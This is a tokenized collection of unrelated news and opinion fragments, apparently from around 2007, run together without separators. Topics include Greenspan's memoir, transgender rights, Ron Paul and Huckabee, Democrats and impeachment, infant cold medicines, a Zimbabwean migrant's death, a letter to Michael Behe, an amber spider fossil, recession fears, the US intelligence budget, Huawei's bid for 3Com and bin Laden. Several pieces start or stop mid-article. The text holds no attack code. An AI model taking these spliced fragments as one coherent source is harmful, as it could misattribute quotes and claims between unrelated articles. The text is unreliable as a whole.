Greenspan describes how his mathematical abilities shone through at a young age .
His mom , Rose Goldsmith , used to show off to relatives how he could do addition and multiplication in his head , a likely uncomfortable feat for someone who as a boy was " more inclined to sit in the corner . "
As an avid baseball fan , he developed his own technique of keeping baseball box scores during the 1936 World Series .
" To this day , I can recite the lineup of Yankees starting players , complete with their positions and batting averages , for that World Series , " he says .
Such skills helped him succeed in later years , starting in his first job as an economist making $ 45 a week analyzing obscure , industrial data , later building up a successful consulting firm and then joining the government .
After leading the Fed for more than 18 years , Greenspan today runs his own consulting firm , Greenspan and Associates .
He continues to make speeches for six - figure fees , mainly at private gatherings .
But occasionally he has roiled stock markets when his comments have hit the press , drawing criticism from those who say the guy just does n't know how to retire .
That criticism will likely grow louder , with Greenspan releasing a book the day before the Fed meets to discuss interest rates .
Greenspan started writing The Age of Turbulence a day after he retired in January 2006 .
He wrote the book as he did his speeches at the Fed — in longhand and mainly while sitting in the bathtub , which he does every day since starting the practice after a back injury in the 1960s .
He says the invention of a pen that can write in water has made it easier for his assistants to make out the sometimes soggy papers .
Even here , we are not immune .
Imagine my disgust to read a certain diary today -- I 'll neither link to it nor name names , but you should be able to find the diary easily should you choose to do so -- saying that we should forget about transgender folks in the Employment Non-Discrimination
Act because " they have n't done the work " to gain equal rights .
They have n't done the work ?
Really ?
I do n't believe that for a second , and neither does rserven , who has spent a lifetime " doing the work , " but that 's neither here nor there for the purposes of my diary .
No , my purposes are somewhat simpler : let 's try a little thought experiment .
Were you born in this country ?
If so , how much work did you do to earn your citizenship ?
If you are a citizen above the age of 18 , how much work did you do to earn your right to vote ?
How much work did you do to earn the right to go to school ?
To work in your chosen field ?
To secure housing you could afford ?
To go for a walk in your neighborhood without being harassed for no good reason by the authorities ?
To choose public accommodation without fear that you will be mistreated or barred from service because of the color of your skin ?
How much work did you do to earn the right to prevent the authorities from barging into your home at any time and for any reason without a warrant ?
To protect your right to say what you want without undue governmental interference ?
To practice your own religion ( or lack thereof ) as you see fit , and not as others would demand ?
To earn your right to due process ?
Can we all agree that these are rights ?
That it is a fundamental betrayal of of the Constitution we claim to love , defend , and uphold if we deny these rights to certain classes of people for no good reason ?
That it would remain a betrayal even if the victims of discrimination " did n't do the work " ?
That 's the thing about rights -- they 're not privileges .
You do n't have to work for them .
At least , you should n't have to work for them .
You should just get them , because that 's the way it 's supposed to be and because that 's what the Constitution demands .
And that 's true even if -- and when -- we as a nation hypocritically claim that the Constitution is the basis of our laws while both overtly and covertly sneering at groups that are somehow different in some way from the majority , telling them that the Constitution does n't really count when it comes to them .
So do n't tell me that some group of people -- whether they 're transgender or black or Muslim or Mexican or purple with orange polka dots -- should be allowed to languish in the effects of discrimination because " they did n't do the work . "
You , chances are , did n't do the work either .
And so it 's neither right nor fair nor just for you to enjoy rights that are denied them for no reason other than someone 's bigoted discomfort .
I noticed with great interest that Republican Presidential candidate Mike Huckabee won the real Republican candidate debate which was held in Ft. Lauderdale Florida September 17 , 2007 .
Huckabee won by a substantial margin over runner up , Ron Paul .
I have sort of been overlooking Huckabee .
He is a Southern Baptist pastor .
Or , he was before going into politics .
It stands to reason that he would stand out in a real values debate .
He is certainly the most qualified on the spiritual / moral / values scale .
At this point , I do n't know if I would consider Huckabee as politically conservative as Ron Paul although I would consider him to the right of the no show media darlings that call themselves Republicans .
In my mind Ron Paul 's drive to anchor public policy to the legal constructs of the Constitution still represents the radically healthy break from convention that our nation must have now .
A morally conservative candidate like Mike Huckabee will move us in the right general direction , but it seems that we would be better served to use the objectively tangible parameters of the constitution as our way point .
The Constitution of the United States was built on the appropriate Judeo - Christian foundation .
Strict and radical adherence to that document as a governing principle will not lead us in the wrong direction .
Public policy afloat on the turblence of public opinion and do nothing bi-partisan compromise takes us no closer to safety as I see things .
We have been given a bedrock solid anchor in the Constitution but we 've allowed imbalance in the requisite checks and balances to separate us from that safe mooring .
I like Ron Paul because he wants to steer us toward the clear focal point of the Constitution .
The Democrats and the " main line " , media darlings of the old Republican party promise no real or positive change in my opinion .
They represent different views on how to ballast a ship tossed and battered on a storm churned sea .
They have no plan that will move us to safety .
Their best efforts are only a futile attempt to keep the ship from sinking .
However , the neo-conservatism of the Constitutionalists Republican candidate , Ron Paul offers genuine hope that can turn our nation around and enable us to not only weather the storm but move toward safer waters .
I 'm still hoping against hope that enough people will become sick enough of the status quo that they will listen for and hear the clarion call to reason and get behind Ron Paul .

Katie - Lee 's father , Danny Webster , added : " No one we 've met has ever seen anything like it - we 're forever being stopped in the street and asked , ' Is that a wig ? ' . "
Indeed , some observers could draw comparisons with Russ Abbot 's screen character C U Jimmy , whose ginger toupee is as outrageous as his behaviour .
Katie - Lee 's hair is , of course , natural .
Her father , a print worker , is a redhead so there is no mystery as to where she gets it from .
He and Katie - Lee 's mother , of Ashton - under - Lyne , Greater Manchester , were born almost completely bald , but their first child has had her extraordinary head of hair since day one .
It 's now more than 3in long .
Having such a head start can lead to problems .

I am writing this article to the above mentioned disgruntled Republicans urging them to consider joining the Democratic Party .
Fiscal Responsibility
On the issue of fiscal responsibility the historical record clearly indicates which party has balanced the budget through solid fiscal policies -- and it is n't the Republicans .
The real key to this discussion is total debt outstanding .
If the government 's books are actually balanced , the government wo n't have to issue mountains of debt .
Note that in the last 4 years of the Clinton presidency the total amount of debt outstanding started to substantially decrease .
The reason is simple : Democrats pay for things as we go instead of burdening the next generation with a mammoth amount of debt .
Here is a chart for total federal government outstanding .
The Republicans on the other hand do nothing but increase the total amount of US debt outstanding by an alarming proportion .
If you believe in in responsible fiscal management , the party that best represents you is the Democratic Party .
I do n't say this based on the idea " we will balance the budget " but instead on the historical record -- as in , " we 've already done this and can therefore do it again . "
Social Issues
I have two words regarding social issues : Terry Schiavo .
For those of you who do n't remember this national drama , let me refresh your memory .
One party ( which was n't the Democratic Party ) decided that six years of state level court actions were wrong .
One party ( which was n't the Democratic Party ) decided that a person 's personal choice about the end of her life ( as adjudicated by a Republican judge ) was not her own business .
One party ( which was n't the Democratic Party ) decided to perform a medical analysis through video tape and announce the conclusions of that analysis on the floor of the Senate .
One party ( which was n't the Democratic Party ) decided that special legislation was required to address this situation .
One party ( which was n't the Democratic Party ) decided to make an extremely personal situation a national political issue .
Is this really the party a moderate Republican wants -- a party who slavishly adheres to the far - rights religious agenda at the expense of personal privacy ?
Or do you think these types of decisions are actually within the individual 's sphere ?
Over the last 6 years , you have seen the far - right religious zealots take control of the Republican party 's domestic agenda .
Is this really what you want ?
Health Care
This is directed especially at business owners and managers .
Over the last 10 years , your biggest problem is health care .
At least once every few years you and your human resources people spend far too much time looking at new policies because the old policy 's premiums have gone through the roof .
You spend way too much time thinking about how to lower the cost of health care without jeopardizing your employees personal situation -- and have found nothing but inadequate answers .
Finally , your international competitors do n't have to worry about this issue because the US is one of only three OECD members that do n't have national health care .
The bottom line is you see a huge problem here .
Which party has actually tried to offer a solution ?
The Republicans have done everything they can to make sure the current system stands .
Is that really in your personal interest ?
Is the current system the best possible answer to your health care problems ?
My guess is the current situation is n't the way you want to deal with this situation .
The bottom line is the Republican party left most Republicans a long time ago .
The idea of fiscal responsibility went out the window with Reagan who increased total federal debt outstanding from a little over 30 % of GDP to a little over 60 % of GDP .
Bush continued this legacy of reckless fiscal policies as he turned a record surplus into $ 3 trillion dollars of net new federal debt .
But Bush added the religious right 's social agenda which interferes and intrudes into any private life it wants .
The idea of " personal liberty " stands -- so long as it is the religious right 's view of personal liberty .
Everyone else is told how and when to live .
As a moderate Republican who believes in fiscal responsibility and the individual 's autonomy you have seen these changes and looked on with horror .
As the Republican 's have slowly moved away from you you kept hoping for them to return .
But they have not .
I now ask you to seriously consider the party that truly represents your values of fiscal responsibility and personal liberty -- The Democratic Party .
On August 14 , 2018 , Joshua Novacheck , a 30 - year - old research engineer for the U.S. National Renewable Energy Laboratory , was presenting the most important study of his nascent career .
He could n’t have known it yet , but things were about to go very wrong .
At a gathering of experts and policy makers in Lawrence , Kansas , Novacheck was sharing the results of the Interconnections Seam Study , better known as Seams .
The Seams study demonstrated that stronger connections between the U.S. power system ’s massive eastern and western power grids would accelerate the growth of wind and solar energy — hugely reducing American reliance on coal , the fuel contributing the most to climate change , and saving consumers billions .
It was an elegant solution to a complicated problem .
Democrats in Congress have recently cited NREL ’s work to argue for billions in grid upgrades and sweeping policy changes .
But a study like Seams was politically dangerous territory for a federally funded lab while coal - industry advocates — and climate - change deniers — reign in the White House .
The Trump administration has a long history of protecting coal companies , and unfortunately for Novacheck , a representative was sitting in the audience …
Radio hosts slam top Democrats for reluctance to consider impeachment Jason Rhyne
Published : Monday October 15 , 2007
del.icio.us
Print This Email This Reid : Impeachment is a ' foolish idea ; ' Pelosi does n't see justification House Speaker Nancy Pelosi ( D - CA ) and Senate Majority Leader Harry Reid ( D - NV ) -- the top Democratic leaders from each of their respective chambers of Congress -- are drawing fire for a pair of recent radio appearances in which they reiterated their opposition to pursuing the impeachment of President George W. Bush .
In an interview Oct. 9 with nationally syndicated liberal radio host Ed Schultz , Pelosi defended previous statements in which she had promised that " impeachment was off the table . "
" I do n't see a connection between this and impeachment , " Pelosi said , asked about a newly released secret memo on US interrogation tactics .
A moment later , she side - stepped a repeat of the same question by elaborating on her goal to " bring the country behind a return to an America that honors the vision of our founders . "
" I do n't see that impeachment is in furtherance of bringing the people together in that way , " she said .
" If somebody else out there has reason to think that they have evidence that the president has committed an impeachable offense that can pass the Congress , please let me know that , " she continued , " but at the present time , I do n't think that the justification is there for that . "
Late Friday , Schultz told RAW STORY that the speaker 's unwillingness to realistically discuss the impeachment option -- or even to entertain a theoretical scenario in which it might merit real consideration -- was tantamount to giving President Bush a " license to do whatever he wants to do . "
" I think the Democratic leadership has signaled to the American people that there is no set of facts , no turn of events that would rise to the level of impeachment , " Schultz said , adding that he thought the party 's leaders had " pretty much given up . "
" Our callers are extremely passionate about the truth , " he continued .
" They 're extremely passionate about the Constitution , and poor Democrats feel like the leadership is letting them down . "
Reid , too , dismisses impeachment
For those Democratic voters who believed a majority in Congress might have greased the wheels for possible action on impeachment , another recent interview with top Senate Majority Lead Harry Reid did little to kindle hope .
In a recent Q&A with left - leaning host Christiane Brown of Reno's KJFK radio , Reid dismissed the notion as a " waste of time " that would succeed only in handing the White House to Vice President Dick Cheney .
" The clincher of it all , " added Reid , " is that we 'd end up with Cheney as president .
Does anybody want that ? "
" What people want to know is why do we want to wait for more deaths over the next year because we say our hands are tied , " said Brown of the war in Iraq , adding that Cheney could be impeached as well .
" Well , I respectfully suggest to anyone that suggests impeachment , " the senator replied , " that it 's a very foolish idea . "
Brown , however , who shot back on - air that " respectfully , I disagree and I know there are a lot of people that do , " told RAW STORY that she could n't grasp Reid 's " strange thinking . "
" It just seems to me that they 've already made their mind up that impeachment is n't an option , " she said of Reid and other Democrats , like Pelosi , that brush off even the notion of impeachment .
" We just hear a lot of excuses all the time , " Brown said , citing Reid 's insistence on her program that the trappings of an impeachment would be an unneeded distraction that served little effective purpose in the waning days of Bush 's final term .
" None of these arguments stand up , " she continued .
" You have to do what 's right ... I think Americans want to see some accountability , and we 're now being told that we 're foolish to even consider it .
It seems like [ Congress ] is looking for every reason not to get rid of this president . "
' It 's all about ' 08 '
The logic , Brown says , does n't play out .
She theorizes that " maybe they think that having Bush in power is going to help them with their numbers in 2008 . "
According to impeachment activist David Swanson , that 's precisely the reason .
Co-founder of AfterDowningStreet.org , and the Washington director of Democrats.com and ImpeachPAC.org , Swanson believes that reluctance among Democratic leaders has nothing to do with the a lack of justification for drafting impeachment articles and everything to do with politics .
" The Bush Administration is throwing out impeachable offense after impeachable offense , " Swanson said .
He counts Bush 's " refusal to honor subpoenas , " frequent signing statements and controversial intelligence gathering techniques as part of a roster of administration actions that warrant impeachment .
But Congress , in his opinion , is n't making a push for the president 's removal because " Nancy Pelosi actually believes the best way to win elections is to keep Bush in office . "
In Swanson 's view , top Democrats have quietly committed to an electoral strategy that seeks to hang the albatross of an unpopular but still - serving President Bush around the necks of 2008 GOP contenders -- both the eventual Republican presidential nominee as well as the party 's House and Senate candidates down ticket .
" And there 's a view of history that says that is n't only morally disgusting , it 's also wrong politically , " he continued , adding that not only did Democrats have a responsibility to prosecute what he considers impeachable offenses , but also that impeachment itself was n't inherently detrimental politically .
" Never has a party suffered for bringing impeachment , " Swanson said , going on to mention that impeachment measures led by Democrats against former President Richard Nixon actually preceded a landslide victory for congressional Democrats in the 1974 mid-term elections .
Even after impeachment against President Bill Clinton , a very unpopular impeachment Swanson points out , Republicans lost fewer seats in the 2000 election than historical norms for a six - term congressional majority .
" They held onto both houses and the White House , " he said .
" Democrats should be thankful to suffer that kind of fate . "
Schultz enthusiastically agrees .
He believes that looming election concerns are powering much of the reluctance among House and Senate leadership .
" It 's all about ' 08 , " he said .
" They want the White House .
They can't turn the country around unless they have the White House .
They 're serious about change , they 're concerned about the country , but they think it would divide the country 's future if impeachment were brought .
And they 're not willing to roll those dice . "

WASHINGTON , Oct. 11 — Major makers of over - the - counter infant cough and cold medicines announced today that they were voluntarily withdrawing their products from the market for fear that they could be misused by parents .
The voluntary withdrawal affects only products labeled for “ infants , ” not those for use in children 2 and older .
And some small companies may continue selling the products .
The move comes two weeks after safety reviewers within the Food and Drug Administration urged the agency to consider an outright ban of over - the - counter cough and cold products for children under the age of 6 .
Even the industry ’s own trade association , the Consumer Healthcare Products Association , recommended two weeks ago that the products should no longer be used for infants .
Despite this recommendation , makers continued to sell cough and cold products labeled for infants .
Last week , Representative Henry A. Waxman , the California Democrat who is chairman of the House Committee on Oversight and Government Reform , sent a letter to the industry ’s trade association asking why “ in direct contradiction to this recommendation , however , many C.H.P.A. member companies are currently marketing these products for use in children under 2 . ”

Many Zimbabweans head to South Africa to escape economic misery
Adonis Musati , 23 , was a police officer in Chimanimani in eastern Zimbabwe , but the economic crisis led him to South Africa to try to support his family .
He had spent a month at the Home Affairs Refugee Centre , trying to get a work permit , reportedly with nothing to eat , sleeping in a cardboard box .
His family said they had learned of Adonis 's death on the internet .
The BBC's Southern Africa correspondent Adam Mynott says Adonis Musati left Zimbabwe and crossed into South Africa more than a month ago .
It is a disgrace that someone should die of hunger in one of South Africa 's richest cities
Refugee rights spokesman Braam Hanekom
Like tens of thousands of his countrymen he had hoped to find work , but was unable to get a permit .
On Friday 2 November , he collapsed on a traffic island near the offices of South Africa 's home affairs refugee centre in Cape Town and was found dead .
Braam Hanekom of Passop , a refugee rights organisation , told our reporter that Adonis appeared to have died of hunger , having not eaten for four days .
But fellow Zimbabweans who met him outside the refugee centre told the South African news website IOL that he had not eaten for two weeks .
" It is a disgrace that someone should die of hunger in one of South Africa 's richest cities , " said Mr Hanekom .
He said there are 25,000 Zimbabweans like Adonis Musati in Cape Town looking for work and food .
Up to 3 m Zimbabweans have arrived in South Africa to escape the economic crisis in their own country .
Family members living in Sasolburg in the Free State , are now in Cape Town to identify his body and to make funeral arrangements .
His cousin Ivy Dhliwayo said the family had not heard of Mr Musati 's death from the Zimbabwean consulate , nor from the South African government .
" ( His twin brother ) Adbell read a story on the internet , and that is how the whole family found out , " she said .
Passop says it is funding the relatives ' expenses and will try to get Musati 's body back home for burial .
An Open Letter to Dr. Michael Behe October 22 , 2007 05:44 MST
Dear Dr. Behe
I have recently read your response to Abbie Smith ’s article on the HIV - 1 protein VPU .
Ms Smith showed how Vpu’s recently evolved viroporin activity directly contradicts your statement that HIV has evolved no new biding sites since it entered humans ( Edge of Evolution , page 143 and figure 7.4 , page 144 ) .
I was greatly disappointed in your response .
I must admit to having a special involvement in this case .
Firstly , I drew the illustrations for Ms Smith ’s article , and its follow up .
But secondly , as a member of my professional association ’s education committee , I am directly concerned with the support and nurturing of the new generations of enquiring minds , those that we will pass the torch of enquiry on to when we retire .
It is in this regard that your response very disturbing .
It is almost the exact opposite of what a concerned scientist and science communicator should have done .
It was bad enough that you chose to ignore her for over two months and then did not do her the courtesy of replying on her blog ( 1 ) .
It was bad enough that you chose to start by belittling her and playing the “ I ’m a Professor and she is a mere student ” card ( conveniently ignoring the fact that she actually works on HIV ) .
This is particularly egregious in science , where we pay attention to the evidence and logic of an argument , rather than the letters after an author ’s name .
Doubly so if we wish to guide young scientists into a demanding profession .
But by far the worst , you ignored her core argument .
That in the space of a decade HIV - 1 Vpu developed a series of binding sites that made it a viroporin , a multisubunit structure with a function previously absent from HIV - 1 .
Dr. Behe , it is not enough to cite a generalist review and claim that the differences between HIV - 1 strains are “ not all that great ” .
You actually have to show why Vpu developing binding sites to form a multi- subunit structure with a novel function does not falsify your claim that HIV has developed no new binding sites .
Ironically , the very paper you cite to dismiss Ms Smith contains evidence of at least two new binding sites in HIV .
I will not dwell on this any further , as Ms Smith is producing her own response .
Diagramatic representation of a viral viroporin ( ion channel ) , such as Vpu. SIV Vpu and non-M class HIV Vpu’s do not have viroporin activity .
This is exactly an example of the kind of protein - protein interaction and new molecular machinery that Dr. Behe demands , but has completely ignored in his response to Ms Smith .
Image from FEBS Letters 552 ( 2003 ) 28 -34 .
But I will comment on one other aspect of your response .
Not content with dismissing Ms Smith , you make an incorrect statement as a central part of your argument .
Another , more important point to note is that I ’m considering just cellular proteins binding to other cellular proteins , not to foreign proteins .
Foreign proteins injected into a cell by an invading virus or bacterium make up a different category .
[ emphasis added here [ by MB ] ]
The foreign proteins of pathogens almost always are intended to cripple a cell in any way possible .
Since there are so many more ways to break a machine than to improve it , this is the kind of task at which Darwinism excels .
Like throwing a wad of chewing gum into a finely tuned machine , it ’s relatively easy to clog a system — much easier than making the system in the first place .
Destructive protein - protein binding is much easier to achieve by chance .
This is simply not true , either generally ( 2 ) or in the particular case of Vpu .
Importantly , your statement shows that you do not understand what Vpu does .
Vpu down regulates the surface protein CD4 ( the Viroporin activity is something separate related to viral release ) .
It does not “ gum - up ” CD4 , it specifically binds to it , then binds to a separate protein ( the β TrCP subunit of the SCF β TrCP ubiquitin ligase complex ) in the Golgi apparatus ( all except the C strains , which target the plasma membrane ) .
This multiprotein complex links to the ubiquitin - proteasome pathway , where CD4 is ignominiously broken down by the cells own mechanisms .
This CD4 – Vpu–βTrCP complex is NOT mere “ gumming up of the works ” but a precise targeting of CD4 the proteosome by Vpu .
This is not obscure , but has been well known for some time .
Vpu binding to CD4 and β TrCP , which then targets CD4 for degradation .
As you can see this is not Vpu randomly gumming up the works , but a macromolecular complex of the sort Behe demands .
Taken from Margottin F , et al. , 1998
In the context of Ms Smith ’s argument , HIV - 1 Vpu has a new binding site , YRKL in the cytoplasmic alpha helical section , not present in SIVcpz Vpu , which efficiently targets Vpu to the Gogli complex , making the degradation process more efficient .
Can you please explain why the appearance of a new targeting motif in HIV - 1 Vpu is NOT an example of a new binding site .
The fact that you chose to dismiss Ms Smith on the basis of your ignorance of how Vpu actually works , as well as ignoring her central argument is of great concern .
As scientists , we have a duty both to deal with arguments carefully , and to nurture upcoming young researchers .
Dr. Behe , you have failed both these duties .
You owe Ms Smith a complete apology for such behaviour .
Your sincerely , Ian Musgrave

A 50 - million - year - old fossilised spider has been brought back to life in stunning 3D by a scientist at The University of Manchester .
In a paper published in the latest issue of the Zootaxa journal , Dr David Penney and co-authors from Ghent University in Belgium report on the use of a technique called ' Very High Resolution X - Ray Computed Tomography ' ( VHR - CT ) to ' digitally dissect ' tiny fossils and reveal the preservation of internal organs .
Dr Penney , from The School of Earth , Atmospheric and Environmental Sciences ( SEAES ) , specialises in studying spiders trapped and preserved in amber tens of millions of years ago .
The male spider studied in his latest paper is a new species named Cenotextricella simoni .
It is around 53 - million years old and was found preserved in amber in an area of France known as the Paris Basin .
This is the first time the VHR - CT technique has been used to digitally dissect a fossil in amber - and Dr Penney says it has the potential to ' revolutionise ' their study .
The VHR - CT technique was originally developed for medical diagnostic purposes .
Dr Penney said : " This technique essentially generates full 3D reconstructions of minute fossils and permits digital dissection of the specimen to reveal the preservation of internal organs .
" Up until recently the only place to do such scans was at The University of Texas , although they never achieved results like these .
" My colleagues in the department of Subatomic and Radiation Physics at Ghent University in Belgium have significantly increased the resolution of the technology , bringing some quite amazing results .
" This is definitely the way forward for the study of amber fossils .
" Amber provides a unique window into past forest ecosystems .
It retains an incredible amount of information , not just about the spiders themselves , but also about the environment in which they lived . "
Dr Penney is currently spending an indefinite period in the African jungle in a ' living laboratory ' studying spiders .
Earlier this year , a species of spider which dates back more than 20 million years was named after Dr Penney .
The amber - encased spider which was discovered deep in a Mexican mine is thought to have lived long before the first humans .
It was found by a Mexican researcher who earned the right to name the species and he chose the name ' Episinus penneyi ' in honour of his former colleague .

WASHINGTON ( Reuters ) - Unsold goods are piling up in warehouses as the housing meltdown and soaring oil prices strain consumers , raising fears that already glum fourth - quarter growth prospects may tip toward recession .

Unsold goods are piling up in warehouses as the housing meltdown and soaring oil prices strain consumers , raising fears that already glum fourth - quarter growth prospects may tip toward recession .
REUTERS / Tim Shaffer
Federal Reserve Chairman Ben Bernanke warned last week that economic growth would slow from the third quarter ’s surprisingly strong 3.9 percent annual rate .
But recent data on inventories suggests the slowdown may be even more severe than the central bank has anticipated .
Wholesale inventories rose 0.8 percent in September , far greater than the 0.2 percent gain that analysts had expected , according to government data released last week .
That will likely boost third - quarter growth even more , but take a toll on the current period as businesses work off the unsold goods .
The Institute for Supply Management ’s closely watched report on manufacturers told a similar story for October .
ISM ’s survey , released earlier this month , showed that manufacturers were increasingly worried about customers ’ inventory levels , with stockpiles growing in a wide range of sectors , from plastics and rubber products to food and tobacco .
“ The main source of concern at this point is how this inventory build will unwind in the fourth quarter , ” Merrill Lynch analyst David Rosenberg wrote in a note to clients .
Rosenberg estimated that revised third - quarter GDP data will show an extra $ 18 billion in inventory .
An equal amount may be erased from the fourth quarter , which would take his GDP forecast “ perilously close to flat , or even negative . ”
Ordinarily , an inventory build - up is seen as a temporary imbalance that the world ’s biggest economy can quickly digest .
But with consumer confidence sliding and recession fears mounting , this inventory spike raises questions about demand .
Determining how the current episode will play out is tricky because economists have few tools to gauge how tightening credit will ultimately affect spending , said Douglas Lee , chief economist for research group Economics from Washington .
Until recently , Lee had been expecting the economy to grow at a 1.5 percent pace in the fourth quarter .
Now , he thinks it will come to a standstill , in part due to swelling inventories , and he looks for only modest improvement in the first quarter .
“ A negative growth rate in the fourth quarter is quite possible , ” he said .
While one quarter of contraction may not meet the recession criteria , “ recession risk is rising and recession talk will fill the news . ”
Lee said some of the third - quarter inventory increase was tied to auto manufacturers bracing for possible labor strikes , and those cars will likely be sold off in the coming months .
But inventories also rose in many other categories , suggesting that consumption was weaker than expected .
That may be tougher to overcome as consumers grapple with a housing recession , steep energy costs and tightening credit terms .
Strong export sales made up for some of the domestic weakness last quarter , but it is unlikely that the pace will be sustained in the current period , Lee said .
HISTORY REPEATING ?
Jan Hatzius , an economist with Goldman Sachs , noted that ISM ’s customer inventories index jumped to 54.0 in October from 50.0 a month earlier , putting it at the highest point since January 2001 -- two months before the last recession began .
“ The fact that there was a very similar spike before the 2001 recession suggests that this index may be a valuable near - horizon indicator of recession because it signals real urgency in scaling back production , ” he wrote .
The overall ISM manufacturing index for October slipped to 50.9 from 52.0 , consistent with a slow - growing economy .
The sluggishness is apparent in the retail sector , where 70 percent of chain stores posted weaker - than - expected October sales results , according to research firm Retail Metrics .
" We expect the challenging retail environment to continue for the foreseeable future , " Mike Ullman , chairman and chief executive officer of department store chain J.C. Penney JCP.N , said last week .
He added that the company would keep inventory levels tight through 2008 .
That was far gloomier than his assessment just a month earlier , when he said he was “ encouraged ” by customers ’ response to fall merchandise , despite the housing woes .
Investors will get a closer look at the health of the retail sector on Wednesday , when the Commerce Department releases its monthly retail sales report .
Economists polled by Reuters are expecting a slim 0.2 percent rise for the month , which would be down sharply from September ’s 0.6 percent gain .
Ullman is not the only CEO to turn more pessimistic in recent weeks .
John Chambers , CEO of technology heavyweight Cisco Systems Inc CSCO.O , helped spark a stock market rally in August when he said this was the strongest global economy he had seen in his career .
But last week , Chambers reported “ dramatic decreases ” in orders from U.S. banks and predicted that demand from segments such as banking and retail would remain “ lumpy ” for a while .
The key question is whether that “ lumpy ” demand will force a reluctant Fed to step in with more interest rate cuts .

Declassified : US spying could top $ 50 billion in 2007 Jason Rhyne
Published : Tuesday October 30 , 2007

The tab for US non-military spying in 2007 is a whopping $ 43.5 billion , according to figures released today by National Director of Intelligence Mike McConnell .
Disclosure of that amount marks the first time in nine years that funds budgeted for national intelligence activities have been publicly aired , and comes amid mounting pressure from Congress and the Sept. 11 commission to make the practice routine .
A more complete budget figure for US spying is actually even higher , according to sources cited in the Washington Post , who told the paper that if still - classified totals for military - based programs were factored in , that number would reach $ 50 billion .
 While the budget figure released by McConnell excludes intelligence programs for the separate military services ,  reports the Post , it includes the budgets of the CIA , the Defense Intelligence Agency , the FBI 's intelligence programs , the State Department 's Bureau of Intelligence and Research and the major Defense Department intelligence collection agencies . 
The last time such figures were announced -- the spying budget including military spending was $ 26.5 billion in 1998 -- it took a Freedom of Information Act lawsuit from the Project of Government Secrecy at the Federation of American Scientists to force their publication .
That organizations director , Steven Aftergood , told RAW STORY Tuesday that revealing the cost of spying activities could cause a stir within intelligence circles .
 Disclosure of the intelligence budget figure may have significant repercussions for national security classification policy ,  he said , just because it was so strongly opposed by the intelligence community .
Even after his groups successful Freedom of Information Act action , Aftergood said intelligence officials literally swore that any further disclosures would damage national security .
He points to statements made by former CIA Director George Tenet , who told a federal court in 2003 that the intelligence budget was of great interest to nations and non-state groups ... wishing to calculate the strengths and weaknesses of the United States ,  and went on to say that disclosure of a budget total could cause serious damage to the United States .
 Even historical budget information from half a century ago shouldnt be released , Aftergood said officials maintained , citing a statement to that effect from former US Deputy Director of Central Intelligence John McLaughlin , who in 2004 wrote that such material must be withheld from public disclosure ... because its release would tend to reveal intelligence methods . "
 Now it appears that such information may safely be disclosed after all ,  Aftergood said .
 Because the new disclosure is so sharply at odds with past practice , it may introduce some positive instability into a recalcitrant classification system .
The question implicitly arises , if intelligence officials were wrong to classify this information , what other records are they wrongly withholding ?
A news release from Director McConnell 's office disclosing the new numbers , obtained by Aftergood , is available here .

The company grew rapidly through the late 1990s , and at the height of the Internet boom in 2000 , 3 Com ’s stock price rose briefly above $ 100 a share , only to plummet in the dot - com bust and as a result of management gaffes .
Among those problems was the 1997 acquisition of the modem maker U.S. Robotics and its Palm Computing operation , maker of a line of hand - held electronic organizers .
3Com ’s Palm business was seen on Wall Street as a distraction from 3 Com ’s core businesses , and in 2000 , 3Com spun off Palm as separate public company that now makes the Treo line of smartphones .
Since then , 3Com has continued to fall further behind its rival Cisco , which has aggressively acquired technology it needed to keep ahead of other competitors .
3Com , with revenue last year of $ 1.3 billion , has not posted a profit for six years .
The proposed sale is almost certain to attract close scrutiny in Washington , where Huawei has long attracted suspicions over supposed links to China ’s military and intelligence agencies .
The company ’s reclusive founder and president , Ren Zhengfei , is a former Chinese army engineer .
Michael R. Wessel , a commissioner of the United States - China Economic and Security Review Commission , which was created by Congress to monitor bilateral relations , said that the federal government ’s Committee on Foreign Investment in the United States “ should take a hard look at this transaction ” before allowing Huawei to buy part of 3Com .
Mr. Wessel , who also criticized the Chinese company Lenovo ’s acquisition of I.B.M. ’s personal computer business three years ago , pointed to reports this month that Chinese hackers had tried to penetrate military computer systems at the Pentagon and in Britain .
He said that Huawei ’s control of an important network security provider like 3Com would raise national security issues .
If the 3Com deal becomes controversial , as did a bid by Cnooc Ltd. of China for Unocal two years ago or DP World ’s effort last year to acquire control of American port facilities , then the transaction may also draw attention to Bain Capital in the race for the Republican presidential nomination .
Mitt Romney , a candidate for the nomination , was the chief executive of Bain Capital for 15 years before his successful run in 2002 to become governor of Massachusetts .
His financial disclosure form last month showed that he and his immediate family earned more than $ 8 million last year from Bain Capital , with stakes in more than 30 Bain Capital funds .

Osama Who ?
In this past week 's statement bin Laden noted :
And if you would like to get to know some of the reasons for your losing of your war against us , then read the book of Michael Scheuer in this regard .
In fact , Michael Scheuer 's understanding of bin Laden and al Qaeda may well be more penetrating than that of any other observer in the U.S. or Europe .
Scheuer has written two worthwhile books : Imperial Hubris : Why the West is Losing the War on Terror and Through Our Enemies ' Eyes : Osama Bin Laden , Radical Islam , and the Future ofr America .
Bin Laden is probably referring to the first book , Imperial Hubris .
Scheuer was the CIA 's leading expert on bin Laden and al Qaeda before he was made to feel unwelcome and essentially forced out of the Agency after publishing Imperial Hubris anonymously in 2004 .
In Scheuer 's view bin Laden is certainly not crazy .
He is highly intelligent , and he speaks coherently and persuasively to his audience .
He is regarded throughout the Arab World as astute and dignified , and he appears to possess genuine charisma .
He has excellent organizational skills , and he thinks strategically .
He has the capacity to imbue his followers with great loyalty and sense of mission -- even unto martyrdom for his , and their , cause .
Watch video of him closely .
He does not rant .
He does not rave .
He does not foam at the mouth .
He does not gesticulate manically like Der Führer or stare wild - eyed into the camera .
He appears to speak with conviction and with gravitas .
At least most Arab observers think so .
Perhaps the most important point Scheuer makes is that bin Laden does not hate the U.S. or its ( or other Western ) people for what they are or for what they personally believe .
He is opposed to specific U.S. policies in the Arab and Islamic World and seeks to organize and inspire resistance to those policies .
In Imperial Hubris Scheuer boils down bin Laden 's world view to opposition to six major elements of U.S. policy :
(1) Unquestioning U.S. support for Israel , especially U.S. support for Israel 's heavy - handed treatment of Palestinians .
(2) The presence of U.S. troops on the Arabian Peninsula .
Bin Laden and his sympathizers view this presence as an occupation .
(3) The U.S. occupation of Afghanistan , and now of Iraq .
(4) U.S. support for what bin Laden considers to be the suppression of Islamic minorities in Russia , China , and India .
(5) U.S. pressure on Arab energy producers to keep the world markets awash in sufficient oil to keep oil prices low for the U.S. and other Western powers .
Bin Laden believes that more oil revenues should be allocated for the benefit of Arab peoples .
